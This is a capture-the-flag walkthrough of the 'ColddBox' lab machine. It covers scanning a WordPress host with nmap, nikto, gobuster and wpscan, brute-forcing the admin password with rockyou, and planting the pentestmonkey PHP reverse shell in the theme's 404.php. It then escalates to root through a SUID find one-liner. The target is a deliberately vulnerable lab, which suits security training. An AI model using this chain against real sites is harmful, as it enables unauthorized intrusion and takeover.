Solved without using Metasploit

Host Discovery Scanning 

```
sudo netdiscover 192.168.69.0/24
```

we found the machine running on `192.168.69.4` 

Full Scan

```
sudo nmap -sS -sV -sC -p- 192.168.69.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 02:25 CDT
Nmap scan report for 192.168.69.4
Host is up (0.000063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-title: ColddBox | One more machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
MAC Address: 08:00:27:38:BD:A5 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
```

Another Recon Tool 

```
└─$ sudo nikto -host http://192.168.69.4/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.69.4
+ Target Hostname:    192.168.69.4
+ Target Port:        80
+ Start Time:         2024-06-25 02:29:19 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /hidden/: This might be interesting.
+ /xmlrpc.php: xmlrpc.php was found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-login.php: Wordpress login found.
+ 8102 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2024-06-25 02:29:34 (GMT-5) (15 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Directory Traversal 

```
└─$ gobuster dir -u http://192.168.69.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.xml,.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.69.4
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,xml,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.69.4/]
/wp-content           (Status: 301) [Size: 317] [--> http://192.168.69.4/wp-content/]
/wp-login.php         (Status: 200) [Size: 2547]
/license.txt          (Status: 200) [Size: 19930]
/wp-includes          (Status: 301) [Size: 318] [--> http://192.168.69.4/wp-includes/]
/readme.html          (Status: 200) [Size: 7173]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 315] [--> http://192.168.69.4/wp-admin/]
/hidden               (Status: 301) [Size: 313] [--> http://192.168.69.4/hidden/]
/xmlrpc.php           (Status: 200) [Size: 42]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/wp-signup.php        (Status: 302) [Size: 0] [--> /wp-login.php?action=register]
/server-status        (Status: 403) [Size: 277]
```

Its running WordPress , let use `wpscan` for vulnerablities 

```
sudo wpscan --url http://192.168.69.4
[+] URL: http://192.168.69.4/ [192.168.69.4]
[+] Started: Tue Jun 25 02:36:07 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.69.4/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.69.4/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.69.4/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.69.4/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://192.168.69.4/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://192.168.69.4/wp-content/themes/twentyfifteen/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://192.168.69.4/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.7
 | Style URL: http://192.168.69.4/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.69.4/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'
```

By Gobuster we got to know a path `hidden` , we got msg say  username `C0ldd` `Hugo` `Philip`

<img src="./img/Pasted image 20240625130037.png" alt="Example Image" width="1080"/>

Let Use Dictionary attack , with user `C0ldd`

```
sudo wpscan --url http://192.168.69.4  -U c0ldd -P /usr/share/wordlists/rockyou.txt
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```

192.168.69.4/wp-admin

<img src="./img/Pasted image 20240625131247.png" alt="Example Image" width="1080"/>

we got a admin access , its running Twenty Fifteen Theme

<img src="./img/Pasted image 20240625131524.png" alt="Example Image" width="1080"/>

Go to Appearance --> Editor --> 404.php

<img src="./img/Pasted image 20240625131953.png" alt="Example Image" width="1080"/>

download this php reverse shell from monkey pentest  , modify the ip and port your machine 

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

<img src="./img/Pasted image 20240625132123.png" alt="Example Image" width="1080"/>

copy that file and paste in 404.php , and upload 

<img src="./img/Pasted image 20240625132232.png" alt="Example Image" width="1080"/>

start listener using netcat , at specified port , go to 404 error page 

http://192.168.69.4/wp-content/themes/twentyfifteen/404.php


<img src="./img/Pasted image 20240625132611.png" alt="Example Image" width="1080"/>

we got a shell , but import proper bin/bash using python

<img src="./img/Pasted image 20240625132952.png" alt="Example Image" width="1080"/>

in C0ldd folder we can't have privilege to cat user.txt , 

```
find / -perm -4000 -type f 2>/dev/null
```

This command find which command as root `suid` permission 
\
<img src="./img/Pasted image 20240625133306.png" alt="Example Image" width="1080"/>

`find` command can be used to escalate root privilege  

https://gtfobins.github.io/gtfobins/find/#suid

form gtfobins we know and can have have root shell 

```
find . -exec /bin/sh -p \; -quit
```

<img src="./img/Pasted image 20240625133834.png" alt="Example Image" width="1080"/>

we have been the machine , and got the root flag 

```

cd /root
root.txt
cat root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
echo "wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=" | base64 -d
¡Felicidades, máquina completada!  

cd /home/c0ldd
cat user.txt
echo "RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==" | base64 -d
Felicidades, primer nivel conseguido! 

```

